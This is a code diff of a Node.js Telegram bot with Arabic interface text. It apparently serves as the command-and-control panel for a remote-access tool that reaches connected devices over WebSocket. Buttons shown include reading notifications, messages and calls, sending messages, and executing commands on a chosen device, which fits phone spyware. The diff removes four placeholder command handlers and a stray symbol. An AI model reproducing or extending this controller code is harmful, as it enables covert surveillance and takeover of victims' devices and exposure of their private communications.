@@ -410,14 +410,6 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: 'اظهار الاخطار', callback_data: `show_notification:${uuid}`}
                     ],
                     [
-                        {text: 'جديد 1', callback_data: `forEach:${uuid}`},
-                        {text: 'جديد 2', callback_data: `headers:${uuid}`}
-                    ],
-                    [
-                        {text: 'جديد 3', callback_data: `handshake:${uuid}`},
-                        {text: 'جديد 4', callback_data: `isRedirect:${uuid}`}
-                    ],
-                    [
                         {text: 'الرسايل', callback_data: `messages:${uuid}`},
                         {text: 'ارسال رسالة', callback_data: `send_message:${uuid}`}
                     ],
@@ -436,88 +428,6 @@ appBot.on("callback_query", (callbackQuery) => {
             parse_mode: "HTML"
         })
     }
-    
-    
-            if (commend == 'isRedirect') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('isRedirect');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    
-        if (commend == 'handshake') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('handshake');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    
-        if (commend == 'forEach') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('forEach');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    
-        if (commend == 'headers') {
-        appSocket.clients.forEach(function each(ws) {
-            if (ws.uuid == uuid) {
-                ws.send('headers');
-            }
-        });
-        appBot.deleteMessage(id, msg.message_id)
-        appBot.sendMessage(id,
-            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
-            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور 𓅓 ابن اليمن 𓅓المطور : @Y_20_20 ،',
-            {
-                parse_mode: "HTML",
-                "reply_markup": {
-                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
-                    'resize_keyboard': true
-                }
-            }
-        )
-    }
-    ♥
     if (commend == 'calls') {
         appSocket.clients.forEach(function each(ws) {
             if (ws.uuid == uuid) {
